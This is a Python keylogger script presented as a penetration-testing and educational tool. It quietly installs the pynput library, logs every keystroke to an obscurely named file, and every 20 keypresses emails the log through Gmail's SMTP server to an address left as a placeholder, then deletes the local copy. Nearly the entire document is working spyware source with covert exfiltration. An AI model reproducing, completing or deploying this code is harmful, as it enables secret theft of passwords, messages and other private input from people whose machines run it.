# WARNING: This program is NOT intended to be used maliciously. This program is intended for use as a legal
# pentration testing tool or for education. This creator holds no responsibility for the actions or outcomes 
# resulting from criminal or malicious use. There is enough bad going on in the world, please don't add to it
# by abusing this program. 

import subprocess

# Install Modules
def install_module(module):
    subprocess.check_call(["pip3", "install", module], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

install_module('pynput')

# Import Modules
from pynput.keyboard import Key, Listener
import smtplib
from email.message import EmailMessage
import socket
import os
import datetime

class Emailer():

    def __init__(self):
        self.timer = 20;

    def reset_timer(self, time):
        self.timer = time;
    
    def email_log(self, log_path):

        if self.timer == 0:
            with open(log_path, 'r') as file:
                msg = EmailMessage()
                msg.set_content(file.read())
                timestamp = '{:%Y-%m-%d %H:%M:%S}'.format(datetime.datetime.now())
                msg['Subject'] = str(socket.gethostname()) + ": " + timestamp
                msg['From'] = str(socket.gethostname())
                msg['To'] = '' #FIXME -> Add gmail here
                server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
                server.ehlo()
                server.login() #FIXME -> Add login and password for gmail account here
                server.send_message(msg)
                server.close()
                self.reset_timer(20)
                os.remove(log_path)
        else:
            self.timer -= 1

class KeyLogger():

    def __init__(self, send_log_via_email=False):
        self.log_path = 'etusetfdsaesadqwes.txt' 
        self.send_log_via_email = send_log_via_email
        self.emailer = Emailer()
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def on_press(self, key):
        with open(self.log_path, 'a') as file:
            file.write(str(key))
        if self.send_log_via_email:
            self.emailer.email_log(self.log_path)


KeyLogger(send_log_via_email=True)
